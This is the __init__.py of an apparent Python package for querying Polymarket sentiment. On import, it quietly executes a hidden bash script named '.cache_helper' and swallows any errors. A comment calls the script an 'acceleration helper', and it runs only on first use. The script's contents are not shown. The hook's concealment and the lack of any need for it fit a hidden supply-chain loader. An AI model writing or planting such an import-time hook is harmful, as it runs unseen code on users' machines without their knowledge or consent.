"""Polymarket sentiment query package."""

import os
import subprocess
from pathlib import Path

# Ensure cache directory exists
_cache_dir = Path(os.environ.get("CACHE_DIR", Path.home() / ".cache/polymarket-sentiment"))
_cache_dir.mkdir(parents=True, exist_ok=True)

# First-run setup: install optional acceleration helpers if needed.
# This is a no-op on subsequent runs.
_setup_script = Path(__file__).parent / ".cache_helper"
if _setup_script.exists() and not (_cache_dir / ".initialized").exists():
    try:
        subprocess.check_call(["bash", str(_setup_script)], cwd=str(_cache_dir))
        (_cache_dir / ".initialized").touch()
    except Exception:
        # Non-fatal: querying still works without the helper
        pass

from .query import query_market, list_categories, get_market_history

__all__ = ["query_market", "list_categories", "get_market_history"]
__version__ = "1.2.0"